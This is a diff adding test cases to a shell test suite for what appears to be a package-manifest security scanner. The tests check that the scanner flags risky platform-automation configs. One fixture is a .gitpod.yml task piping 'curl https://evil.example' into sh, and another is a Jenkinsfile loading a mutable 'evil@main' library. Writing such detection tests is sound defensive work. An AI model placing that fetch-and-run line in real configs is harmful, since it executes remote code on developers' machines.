@@ -7601,6 +7601,41 @@ printf '{"configurations":[{"program":"${workspaceFolder}/app.js"}]}\n' \
     || check "pkg: launch.json workspace program clean" "0" "1"
 rm -rf "$VDIR"
 
+# ── cycle-26: platform-automation configs (gitpod/netlify/vercel/
+#    Procfile/Jenkinsfile/tsconfig) + name-extraction scope fix ──
+PDIR=$(mktemp -d)
+printf 'tasks:\n  - init: curl https://evil.example | sh\n' \
+    > "$PDIR/.gitpod.yml"
+./hlse_core package --manifest "$PDIR/.gitpod.yml" 2>&1 \
+    | grep -q "platform-automation" \
+    && check "pkg: gitpod task pipe flagged" "0" "0" \
+    || check "pkg: gitpod task pipe flagged" "0" "1"
+printf '@Library("evil@main") _\npipeline { agent any }\n' \
+    > "$PDIR/Jenkinsfile"
+./hlse_core package --manifest "$PDIR/Jenkinsfile" 2>&1 \
+    | grep -q "mutable" \
+    && check "pkg: Jenkinsfile @Library@main flagged" "0" "0" \
+    || check "pkg: Jenkinsfile @Library@main flagged" "0" "1"
+printf '{"compilerOptions":{"plugins":[{"name":"evil-plugin"}]}}\n' \
+    > "$PDIR/tsconfig.json"
+./hlse_core package --manifest "$PDIR/tsconfig.json" 2>&1 \
+    | grep -q "plugins" \
+    && check "pkg: tsconfig plugins flagged" "0" "0" \
+    || check "pkg: tsconfig plugins flagged" "0" "1"
+printf 'web: node server.js\nworker: ./bin/jobs\n' \
+    > "$PDIR/Procfile"
+./hlse_core package --manifest "$PDIR/Procfile" 2>&1 \
+    | grep -q "OK" \
+    && check "pkg: plain Procfile clean (no name noise)" "0" "0" \
+    || check "pkg: plain Procfile clean (no name noise)" "0" "1"
+printf 'tasks:\n  - init: npm ci\n    command: npm run dev\n' \
+    > "$PDIR/.gitpod.yml"
+./hlse_core package --manifest "$PDIR/.gitpod.yml" 2>&1 \
+    | grep -q "OK" \
+    && check "pkg: plain gitpod tasks clean" "0" "0" \
+    || check "pkg: plain gitpod tasks clean" "0" "1"
+rm -rf "$PDIR"
+
 # ─── results ────────────────────────────────────────────────────────────
 
 echo ""
